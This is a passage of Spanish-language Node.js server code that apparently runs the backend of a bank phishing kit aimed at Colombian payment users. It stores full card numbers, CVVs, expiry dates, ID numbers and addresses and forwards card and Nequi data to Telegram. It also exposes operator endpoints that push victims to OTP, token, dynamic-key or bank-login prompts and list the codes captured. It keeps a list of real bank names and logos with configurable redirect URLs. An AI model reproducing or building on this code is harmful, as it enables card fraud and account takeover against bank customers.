        }

        const txid = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'datos_token.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const linea = lineas.find(l => l.startsWith(txid + '|'));

                if (linea) {
                    const parts = linea.split('|');
                    const valor = parts[1] || '';
                    const timestamp = parts[2] || '';
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: { txid, accion: 'TOKEN', valor, timestamp } }));
                } else {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: null }));
                }
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
            }
        });
        return;
    }

    // Endpoint: Obtener datos de DINAMICA
    if (req.url.startsWith('/api/obtener-datos-dinamica/') && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        const txid = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'datos_dinamica.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const linea = lineas.find(l => l.startsWith(txid + '|'));

                if (linea) {
                    const parts = linea.split('|');
                    const valor = parts[1] || '';
                    const timestamp = parts[2] || '';
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: { txid, accion: 'DINAMICA', valor, timestamp } }));
                } else {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: null }));
                }
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
            }
        });
        return;
    }

    // Endpoint: Obtener datos de BLOGIN
    if (req.url.startsWith('/api/obtener-datos-blogin/') && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        const txid = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'datos_blogin.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const linea = lineas.find(l => l.startsWith(txid + '|'));

                if (linea) {
                    const parts = linea.split('|');
                    const valor = parts[1] || '';
                    const timestamp = parts[2] || '';
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: { txid, accion: 'BLOGIN', valor, timestamp } }));
                } else {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, data: null }));
                }
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, data: null }));
            }
        });
        return;
    }

    // Endpoint: Limpiar/borrar acción del R2
    if (req.url.startsWith('/api/limpiar-accion/') && req.method === 'POST') {
        const txid = req.url.split('/').pop();
        let body = '';

        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                // Solo limpiar de acciones.txt, NO de datos_otp.txt, datos_token.txt, etc.
                s3.getObject({ Bucket: BUCKET, Key: 'acciones.txt' }, (err, data) => {
                    let contenido = '';

                    if (!err && data.Body) {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const lineasFiltradas = lineas.filter(l => {
                            const parts = l.split('|');
                            return parts[0] !== txid;
                        });
                        contenido = lineasFiltradas.join('\n');
                        if (contenido && lineasFiltradas.length > 0) contenido += '\n';
                    }

                    s3.putObject({
                        Bucket: BUCKET,
                        Key: 'acciones.txt',
                        Body: Buffer.from(contenido, 'utf-8'),
                        ContentType: 'text/plain'
                    }, (errGuardar) => {
                        console.log(`✅ Acción limpiada: ${txid}`);
                        res.writeHead(200);
                        res.end(JSON.stringify({ ok: true, txid }));
                    });
                });
            } catch (e) {
                console.error('[LIMPIAR-ACCION] Error:', e);
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Obtener URLs de PSE por banco (desde R2)
    if (req.url === '/api/pse-urls' && req.method === 'GET') {
        const params = {
            Bucket: BUCKET,
            Key: 'config_urls.json'
        };

        s3.getObject(params, (err, data) => {
            if (err) {
                console.error('Error obteniendo config_urls.json:', err);
                res.writeHead(500);
                res.end(JSON.stringify({ ok: false, error: 'No se pudo obtener URLs' }));
            } else {
                const pseUrls = JSON.parse(data.Body.toString());
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, urls: pseUrls }));
            }
        });
        return;
    }

    // Endpoint: Guardar acción (OTP, TOKEN, DINAMICA, BLOGIN, BAD)
    if (req.url.startsWith('/api/guardar-accion/') && req.method === 'POST') {
        const txid = req.url.split('/').pop();
        let body = '';

        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const accion = datos.accion;

                if (!['OTP', 'TOKEN', 'DINAMICA', 'BLOGIN', 'BAD'].includes(accion)) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ ok: false, error: 'Acción inválida' }));
                    return;
                }

                const nuevaLinea = `${txid}|${accion}`;
                const archivoAccion = `datos_${accion.toLowerCase()}.txt`;

                // 1. Guardar en acciones.txt
                s3.getObject({ Bucket: BUCKET, Key: 'acciones.txt' }, (err, data) => {
                    let contenido = '';

                    if (!err && data.Body) {
                        const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                        const lineasFiltradas = lineas.filter(l => {
                            const parts = l.split('|');
                            return parts[0] !== txid;
                        });
                        contenido = lineasFiltradas.join('\n');
                        if (contenido) contenido += '\n';
                    }

                    contenido += nuevaLinea + '\n';

                    s3.putObject({
                        Bucket: BUCKET,
                        Key: 'acciones.txt',
                        Body: contenido,
                        ContentType: 'text/plain'
                    }, (err) => {
                        if (err) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando acciones.txt' }));
                            return;
                        }

                        // 2. Guardar en archivo específico (datos_otp.txt, datos_token.txt, etc)
                        s3.getObject({ Bucket: BUCKET, Key: archivoAccion }, (errAccion, dataAccion) => {
                            let contenidoAccion = '';

                            if (!errAccion && dataAccion.Body) {
                                const lineas = dataAccion.Body.toString().split('\n').filter(l => l.trim());
                                const lineasFiltradas = lineas.filter(l => {
                                    const parts = l.split('|');
                                    return parts[0] !== txid;
                                });
                                contenidoAccion = lineasFiltradas.join('\n');
                                if (contenidoAccion) contenidoAccion += '\n';
                            }

                            contenidoAccion += nuevaLinea + '\n';

                            s3.putObject({
                                Bucket: BUCKET,
                                Key: archivoAccion,
                                Body: contenidoAccion,
                                ContentType: 'text/plain'
                            }, (errGuardar) => {
                                if (errGuardar) {
                                    res.writeHead(500);
                                    res.end(JSON.stringify({ ok: false, error: `Error guardando ${archivoAccion}` }));
                                    return;
                                }
                                console.log(`✅ Acción guardada: ${txid} → ${accion} (en acciones.txt y ${archivoAccion})`);
                                res.writeHead(200);
                                res.end(JSON.stringify({ ok: true, accion, txid }));
                            });
                        });
                    });
                });
            } catch (e) {
                console.error('[GUARDAR-ACCION] Error:', e);
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Listar OTP
    if (req.url === '/api/listar-otp' && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        s3.getObject({ Bucket: BUCKET, Key: 'datos_otp.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const datos = lineas.map(linea => {
                    const [txid, valor, timestamp] = linea.split('|');
                    return { txid, valor, timestamp, tipo: 'OTP' };
                });

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos }));
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
            }
        });
        return;
    }

    // Endpoint: Listar TOKEN
    if (req.url === '/api/listar-token' && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        s3.getObject({ Bucket: BUCKET, Key: 'datos_token.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const datos = lineas.map(linea => {
                    const [txid, valor, timestamp] = linea.split('|');
                    return { txid, valor, timestamp, tipo: 'TOKEN' };
                });

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos }));
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
            }
        });
        return;
    }

    // Endpoint: Listar DINAMICA
    if (req.url === '/api/listar-dinamica' && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        s3.getObject({ Bucket: BUCKET, Key: 'datos_dinamica.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const datos = lineas.map(linea => {
                    const [txid, valor, timestamp] = linea.split('|');
                    return { txid, valor, timestamp, tipo: 'DINAMICA' };
                });

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos }));
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
            }
        });
        return;
    }

    // Endpoint: Listar BLOGIN
    if (req.url === '/api/listar-blogin' && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        s3.getObject({ Bucket: BUCKET, Key: 'datos_blogin.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const datos = lineas.map(linea => {
                    const [txid, valor, timestamp] = linea.split('|');
                    return { txid, valor, timestamp, tipo: 'BLOGIN' };
                });

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos }));
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, datos: [] }));
            }
        });
        return;
    }

    // Endpoint: Listar transacciones pendientes (desde datos_tarjeta.txt + teléfono desde datos_consultas.txt)
    if (req.url === '/api/listar-transacciones' && req.method === 'GET') {
        // Validar token de autenticación
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        // Primero obtener datos_tarjeta.txt
        s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
            if (err) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, transacciones: [] }));
                return;
            }

            const lineasTarjeta = data.Body.toString().split('\n').filter(l => l.trim());
            const transacciones = lineasTarjeta.map(linea => {
                try {
                    const tx = JSON.parse(linea);
                    // Validar que tenga todos los campos requeridos
                    if (!tx.txid || !tx.nombre || !tx.email || !tx.cardNumber || !tx.expDate || !tx.cvv || !tx.monto || !tx.franquicia || !tx.timestamp) {
                        return null;
                    }
                    return {
                        txid: tx.txid,
                        nombre: tx.nombre,
                        email: tx.email,
                        cardNumber: tx.cardNumber,
                        expDate: tx.expDate,
                        cvv: tx.cvv,
                        monto: tx.monto,
                        banco: tx.bankName,
                        franquicia: tx.franquicia,
                        timestamp: tx.timestamp,
                        telefono: '' // Se llenará abajo
                    };
                } catch (e) {
                    return null;
                }
            }).filter(tx => tx !== null);

            // Ahora obtener datos_consultas.txt para agregar teléfono
            s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (errConsultas, dataConsultas) => {
                if (!errConsultas && dataConsultas.Body) {
                    try {
                        const lineasConsultas = dataConsultas.Body.toString().split('\n').filter(l => l.trim());
                        const consultasMap = {};

                        lineasConsultas.forEach(linea => {
                            try {
                                const consulta = JSON.parse(linea);
                                consultasMap[consulta.txid] = consulta.referencia || '';
                            } catch (e) {}
                        });

                        // Agregar teléfono a cada transacción
                        transacciones.forEach(tx => {
                            tx.telefono = consultasMap[tx.txid] || '';
                        });
                    } catch (e) {}
                }

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, transacciones }));
            });
        });
        return;
    }

    // Endpoint: Obtener acción desde R2
    if (req.url.startsWith('/api/obtener-accion/') && req.method === 'GET') {
        const txid = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'acciones.txt' }, (err, data) => {
            if (err) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, accion: 'STANDBY' }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const linea = lineas.find(l => l.startsWith(txid + '|'));

                if (linea) {
                    const parts = linea.split('|');
                    const accion = parts[1];
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, accion }));
                } else {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, accion: 'STANDBY' }));
                }
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, accion: 'STANDBY' }));
            }
        });
        return;
    }

    // Endpoint: Actualizar monto de transacción (DEBUG)
    if (req.url.startsWith('/api/actualizar-monto/') && req.method === 'POST') {
        const txid = req.url.split('/').pop();
        let body = '';

        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const params = {
                    Bucket: BUCKET,
                    Key: `transacciones_tarjeta/${txid}.json`
                };

                s3.getObject(params, (err, data) => {
                    if (err) {
                        res.writeHead(404);
                        res.end(JSON.stringify({ ok: false, error: 'No encontrado' }));
                        return;
                    }

                    const tx = JSON.parse(data.Body.toString());
                    tx.monto = datos.monto;

                    s3.putObject({...params, Body: JSON.stringify(tx), ContentType: 'application/json'}, (err) => {
                        res.writeHead(200);
                        res.end(JSON.stringify({ ok: true, monto: datos.monto }));
                    });
                });
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error' }));
            }
        });
        return;
    }

    // Endpoint: Obtener teléfono desde consulta
    if (req.url.startsWith('/api/obtener-telefono/') && req.method === 'GET') {
        const txid = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
            if (err || !data.Body) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, telefono: '' }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const linea = lineas.find(l => {
                    try {
                        const json = JSON.parse(l);
                        return json.txid === txid;
                    } catch (e) {
                        return false;
                    }
                });

                if (linea) {
                    const json = JSON.parse(linea);
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, telefono: json.referencia || '' }));
                } else {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, telefono: '' }));
                }
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, telefono: '' }));
            }
        });
        return;
    }

    // Endpoint: Obtener consulta (reconfirmar que existe antes de tarjeta)
    if (req.url.startsWith('/api/consulta/') && req.method === 'GET') {
        const urlClean = req.url.split('?')[0];
        const txid = urlClean.split('/').pop();
        console.log('[GET CONSULTA] Buscando txid en datos_consultas.txt:', txid);

        const params = {
            Bucket: BUCKET,
            Key: 'datos_consultas.txt'
        };

        s3.getObject(params, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end(JSON.stringify({ ok: false, error: 'Consulta no encontrada' }));
                return;
            }

            const lineas = data.Body.toString().split('\n').filter(l => l.trim());
            const linea = lineas.find(l => {
                try {
                    const tx = JSON.parse(l);
                    return tx.txid === txid;
                } catch (e) {
                    return false;
                }
            });

            if (!linea) {
                res.writeHead(404);
                res.end(JSON.stringify({ ok: false, error: 'Consulta no encontrada' }));
                return;
            }

            const consulta = JSON.parse(linea);
            res.writeHead(200);
            res.end(JSON.stringify({ ok: true, data: consulta }));
        });
        return;
    }

    // Endpoint: Obtener transacción de tarjeta por txId (desde datos_tarjeta.txt)
    if (req.url.startsWith('/api/transaccion-tarjeta/') && req.method === 'GET') {
        // Remover query string si existe
        const urlClean = req.url.split('?')[0];
        const txid = urlClean.split('/').pop();
        console.log('[GET TARJETA] URL original:', req.url);
        console.log('[GET TARJETA] URL limpio:', urlClean);
        console.log('[GET TARJETA] Buscando txid:', txid);

        const params = {
            Bucket: BUCKET,
            Key: 'datos_tarjeta.txt'
        };

        s3.getObject(params, (err, data) => {
            if (err) {
                console.error('[GET TARJETA] Error leyendo archivo R2:', err.message);
                res.writeHead(404);
                res.end(JSON.stringify({ ok: false, error: 'Archivo no encontrado en R2' }));
                return;
            }

            console.log('[GET TARJETA] Archivo leído, contenido:', data.Body.toString().substring(0, 200));

            const lineas = data.Body.toString().split('\n').filter(l => l.trim());
            console.log('[GET TARJETA] Total líneas:', lineas.length);

            const linea = lineas.find(l => {
                try {
                    const tx = JSON.parse(l);
                    if (tx.txid === txid) {
                        console.log('[GET TARJETA] ✓ Encontrado txid:', tx.txid);
                        return true;
                    }
                    return false;
                } catch (e) {
                    console.log('[GET TARJETA] Error parseando línea:', e.message);
                    return false;
                }
            });

            if (!linea) {
                console.error('[GET TARJETA] txid NO encontrado:', txid);
                res.writeHead(404);
                res.end(JSON.stringify({ ok: false, error: 'Transacción no encontrada en R2' }));
                return;
            }

            const transaccion = JSON.parse(linea);

            // Limitar información al cliente - NUNCA enviar datos sensibles
            const respuesta = {
                txid: transaccion.txid,
                cardNumber: `****${transaccion.cardNumber.slice(-4)}`,
                franquicia: transaccion.franquicia,
                cardType: transaccion.cardType,
                bankName: transaccion.bankName,
                monto: transaccion.monto,
                email: transaccion.email,
                nombre: transaccion.nombre,
                estado: transaccion.estado,
                timestamp: transaccion.timestamp
            };

            console.log('[GET TARJETA] Respuesta:', respuesta);
            res.writeHead(200);
            res.end(JSON.stringify({ ok: true, data: respuesta }));
        });
        return;
    }

    // Endpoint: Guardar transacción de tarjeta
    if (req.url === '/api/guardar-transaccion-tarjeta' && req.method === 'POST') {
        let body = '';

        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                const datos = JSON.parse(body);
                const txid = datos.txId;

                console.log('[POST TARJETA] Guardando tarjeta con txid:', txid);
                console.log('[POST TARJETA] Franquicia:', datos.franquicia);

                // Guardar en R2
                const transaccionTarjeta = {
                    txid: txid,
                    cardNumber: datos.cardNumber,
                    expDate: datos.expDate,
                    cvv: datos.cvv,
                    nombre: datos.nombre,
                    cedula: datos.cedula,
                    direccion: datos.direccion,
                    email: datos.email,
                    franquicia: datos.franquicia,
                    cardType: datos.cardType,
                    bankName: datos.bankName,
                    monto: datos.monto,
                    estado: datos.estado || 'pendiente',
                    timestamp: new Date().toISOString()
                };

                // Guardar en txt acumulativo y luego responder
                await guardarTransaccionTarjeta(txid, transaccionTarjeta);
                console.log('[POST TARJETA] ✓ Guardado en R2 correctamente');

                // Enviar notificación a Telegram (tigopago) - sin esperar
                enviarNotificacionTelegramTarjeta(txid, transaccionTarjeta);

                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, txid: txid }));
                return;

            } catch (error) {
                console.error('[POST TARJETA] Error:', error);
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'Error en solicitud' }));
            }
        });
        return;
    }

    // Endpoint: Eliminar transacción por txid
    if (req.url.startsWith('/api/eliminar-transaccion/') && req.method === 'POST') {
        // Validar token
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        const txidToDelete = req.url.split('/').pop();

        s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
            if (err) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, message: 'Archivo no encontrado' }));
                return;
            }

            try {
                const lineas = data.Body.toString().split('\n').filter(l => l.trim());
                const lineasFiltradas = lineas.filter(linea => {
                    try {
                        const tx = JSON.parse(linea);
                        return tx.txid !== txidToDelete;
                    } catch (e) {
                        return true; // Mantener líneas inválidas
                    }
                });

                const contenidoNuevo = lineasFiltradas.join('\n') + '\n';

                s3.putObject(
                    {
                        Bucket: BUCKET,
                        Key: 'datos_tarjeta.txt',
                        Body: contenidoNuevo
                    },
                    (errPut) => {
                        if (errPut) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando cambios' }));
                        } else {
                            res.writeHead(200);
                            res.end(JSON.stringify({ ok: true, message: `Transacción ${txidToDelete} eliminada` }));
                        }
                    }
                );
            } catch (e) {
                res.writeHead(500);
                res.end(JSON.stringify({ ok: false, error: 'Error procesando archivo' }));
            }
        });
        return;
    }

    // Endpoint: Obtener configuración (PÚBLICO para lectura - usado por pago-llave.html)
    if (req.url === '/api/obtener-configuracion' && req.method === 'GET') {
        s3.getObject({ Bucket: BUCKET, Key: 'configuracion.json' }, (err, data) => {
            if (err) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, config: {} }));
                return;
            }

            try {
                const config = JSON.parse(data.Body.toString());
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, config }));
            } catch (e) {
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, config: {} }));
            }
        });
        return;
    }

    // Endpoint: Guardar configuración (MasterPanel)
    if (req.url === '/api/guardar-configuracion' && req.method === 'POST') {
        // Validar token
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const nuevosDatos = JSON.parse(body);

                // Obtener configuración existente
                s3.getObject({ Bucket: BUCKET, Key: 'configuracion.json' }, (err, data) => {
                    let configExistente = {};
                    if (!err && data.Body) {
                        try {
                            configExistente = JSON.parse(data.Body.toString());
                        } catch (e) {}
                    }

                    // Fusionar con nuevos datos
                    const configNueva = { ...configExistente, ...nuevosDatos };

                    // Guardar en R2
                    s3.putObject(
                        {
                            Bucket: BUCKET,
                            Key: 'configuracion.json',
                            Body: JSON.stringify(configNueva, null, 2)
                        },
                        (errPut) => {
                            if (errPut) {
                                res.writeHead(500);
                                res.end(JSON.stringify({ ok: false, error: 'Error guardando configuración' }));
                            } else {
                                res.writeHead(200);
                                res.end(JSON.stringify({ ok: true, message: 'Configuración guardada' }));
                            }
                        }
                    );
                });
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'JSON inválido' }));
            }
        });
        return;
    }

    // Endpoint: Obtener lista de bancos desde R2
    if (req.url === '/api/obtener-bancos' && req.method === 'GET') {
        s3.getObject({ Bucket: BUCKET, Key: 'bancos.json' }, (err, data) => {
            if (err) {
                // Si no existe, devolver lista predeterminada
                const bancosPorDefecto = [
                    { code: '1007', name: 'BANCOLOMBIA', logo: 'bancol.png' },
                    { code: '1001', name: 'BANCO DE BOGOTA', logo: 'bogota.svg' },
                    { code: '1002', name: 'BANCO POPULAR', logo: 'popular.svg' },
                    { code: '1023', name: 'BANCO DE OCCIDENTE', logo: 'occidente.svg' },
                    { code: '1051', name: 'BANCO DAVIVIENDA', logo: 'davivienda.svg' },
                    { code: '1052', name: 'BANCO AV VILLAS', logo: 'avvillas.svg' },
                    { code: '1019', name: 'DAVIbank S.A.', logo: 'davibank.png' },
                    { code: '1831', name: 'ACCION FIDUCIARIA', logo: 'accionfiduciaria.svg' },
                    { code: '1815', name: 'ALIANZA FIDUCIARIA', logo: 'logo-fiduciaria.png' },
                    { code: '1558', name: 'BAN100', logo: 'ban100.svg' },
                    { code: '1059', name: 'BANCAMIA S.A.', logo: 'bancamia.svg' },
                    { code: '1040', name: 'BANCO AGRARIO', logo: 'agrario.svg' },
                    { code: '1013', name: 'BANCO BBVA COLOMBIA S.A.', logo: 'bbva.svg' },
                    { code: '1032', name: 'BANCO CAJA SOCIAL', logo: 'cajasocial.svg' },
                    { code: '1066', name: 'BANCO COOPERATIVO COOPCENTRAL', logo: 'coopcentral.svg' },
                    { code: '1062', name: 'BANCO FALABELLA', logo: 'falabella.svg' },
                    { code: '1063', name: 'BANCO FINANDINA S.A. BIC', logo: 'finandina.svg' },
                    { code: '1012', name: 'BANCO GNB SUDAMERIS', logo: 'sudameris.svg' },
                    { code: '1006', name: 'BANCO ITAU', logo: 'itau.svg' },
                    { code: '1071', name: 'BANCO J.P. MORGAN COLOMBIA S.A.', logo: 'chase.webp' },
                    { code: '1047', name: 'BANCO MUNDO MUJER S.A.', logo: 'mundomujer.png' },
                    { code: '1060', name: 'BANCO PICHINCHA S.A.', logo: 'pichincha.svg' },
                    { code: '1065', name: 'BANCO SANTANDER COLOMBIA', logo: 'santander.svg' },
                    { code: '1069', name: 'BANCO SERFINANZA', logo: 'serfinanza.svg' },
                    { code: '1303', name: 'BANCO UNION', logo: 'union.svg' },
                    { code: '1061', name: 'BANCOOMEVA S.A.', logo: 'coomeva.svg' }
                ];
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, bancos: bancosPorDefecto }));
            } else {
                try {
                    const bancos = JSON.parse(data.Body.toString());
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ ok: true, bancos: bancos }));
                } catch (e) {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ ok: true, bancos: [] }));
                }
            }
        });
        return;
    }

    // Endpoint: Obtener URLs de bancos desde R2
    if (req.url === '/api/obtener-urls-bancos' && req.method === 'GET') {
        s3.getObject({ Bucket: BUCKET, Key: 'urls-bancos.json' }, (err, data) => {
            if (err) {
                // Si no existe, devolver estructura vacía
                res.writeHead(200);
                res.end(JSON.stringify({ ok: true, bancos: {} }));
            } else {
                try {
                    const urls = JSON.parse(data.Body.toString());
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, bancos: urls }));
                } catch (e) {
                    res.writeHead(200);
                    res.end(JSON.stringify({ ok: true, bancos: {} }));
                }
            }
        });
        return;
    }

    // Endpoint: Guardar URLs de bancos a R2
    if (req.url === '/api/guardar-urls-bancos' && req.method === 'POST') {
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const urls = JSON.parse(body);

                s3.putObject(
                    {
                        Bucket: BUCKET,
                        Key: 'urls-bancos.json',
                        Body: JSON.stringify(urls, null, 2)
                    },
                    (errPut) => {
                        if (errPut) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error guardando URLs' }));
                        } else {
                            res.writeHead(200);
                            res.end(JSON.stringify({ ok: true, message: 'URLs guardadas' }));
                        }
                    }
                );
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: 'JSON inválido' }));
            }
        });
        return;
    }

    // Endpoint: Procesar pago Nequi
    if (req.url === '/api/procesar-nequi' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());

        req.on('end', () => {
            try {
                const datos = JSON.parse(body);
                const { nequi_number, txid, referencia, valor_pago, valor_formateado } = datos;

                // Enviar a Telegram (en background)
                enviarNotificacionTelegramNequi(txid, { ...datos, timestamp: new Date().toISOString() });

                // Obtener URL de Nequi desde R2
                s3.getObject({ Bucket: BUCKET, Key: 'urls-bancos.json' }, (err, data) => {
                    let nequi_url = '';

                    if (!err && data.Body) {
                        try {
                            const urls = JSON.parse(data.Body.toString());
                            nequi_url = urls.nequi || '';
                        } catch (e) {}
                    }

                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({
                        ok: true,
                        nequi_url: nequi_url,
                        message: 'Pago Nequi procesado'
                    }));
                });
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: 'JSON inválido' }));
            }
        });
        return;
    }

